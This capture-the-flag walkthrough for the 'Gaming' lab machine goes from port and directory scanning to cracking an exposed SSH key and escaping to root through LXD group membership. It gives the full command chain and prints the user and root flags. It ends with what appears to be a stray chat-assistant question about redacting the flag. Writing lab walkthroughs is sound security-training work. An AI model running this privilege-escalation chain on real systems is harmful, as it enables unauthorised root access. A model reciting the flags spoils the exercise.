
# Gaming-THM CTF Walkthrough

This is a step-by-step walkthrough of the ** Gaming-THM** CTF machine. The target is a Linux host running SSH and Apache, with a web-accessible private key that eventually leads to privilege escalation through the **LXD group**.

---

## 🔎 Enumeration

### Nmap Scan

We start with a service/version scan:

```bash
nmap -sV 10.10.246.244
```

Result:

* **22/tcp** → OpenSSH 7.6p1 (Ubuntu)
* **80/tcp** → Apache 2.4.29 (Ubuntu)

---

### Gobuster Directory Scan

```bash
gobuster dir -u http://10.10.246.244 -w /usr/share/wordlists/dirb/common.txt -t 50
```

Findings:

* `/index.html` → landing page
* `/robots.txt` → contains hints
* `/secret/` → contains a private SSH key
* `/uploads/` → writable directory

---

## 🔑 Exploitation

### Step 1: Grab the SSH Private Key

From `/secret/` we download a file `pass` which is an SSH private key.

```bash
chmod 600 pass
```

### Step 2: Crack the Key Passphrase

Convert the key into a John-readable format:

```bash
ssh2john.py pass > hashedkey
john --wordlist=rockyou.txt hashedkey
```

John cracks it quickly:

```
letmein
```

---

### Step 3: SSH Access

Login as user **john**:

```bash
ssh -i pass john@10.10.246.244
```

Enter passphrase: `letmein`.

We’re in.

---

## 🧑‍💻 User Flag

Inside `john`’s home directory:

```bash
cat user.txt
```

```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

---

## 🚀 Privilege Escalation

### Step 1: Group Membership

Check groups:

```bash
id
```

Output:

```
uid=1000(john) gid=1000(john) groups=1000(john),108(lxd)
```

John belongs to the **lxd** group → exploitable.

---

### Step 2: Build an Alpine Image

On the attacker machine (Kali):

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

This produces:

```
alpine-v3.22-x86_64-20250908_1225.tar.gz
```

---

### Step 3: Transfer Image to Target

```bash
scp -i pass alpine-v3.22-x86_64-20250908_1225.tar.gz john@10.10.246.244:/tmp/
```

---

### Step 4: Import and Launch Container

On the target:

```bash
lxc image import /tmp/alpine-v3.22-x86_64-20250908_1225.tar.gz --alias alpine
lxc init alpine ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

---

### Step 5: Escalate to Host Root

Inside container:

```bash
ls /mnt/root
chroot /mnt/root
whoami
```

Output:

```
root
```

---

## 🏆 Root Flag

```bash
cat /root/root.txt
```

Flag obtained 🎉

---

## 📌 Summary

* **Recon** → SSH and Apache open
* **Web enum** → `/secret/` contains private key
* **Crack key** → John the Ripper → passphrase = `letmein`
* **Initial access** → SSH as `john`
* **Privilege Escalation** → LXD container escape
* **Flags**:

  * User: `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`
  * Root: `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

---

🔥 Machine owned!

---

Would you like me to **keep the root flag redacted** (like in most public writeups), or include the actual flag string you captured for `root.txt`?
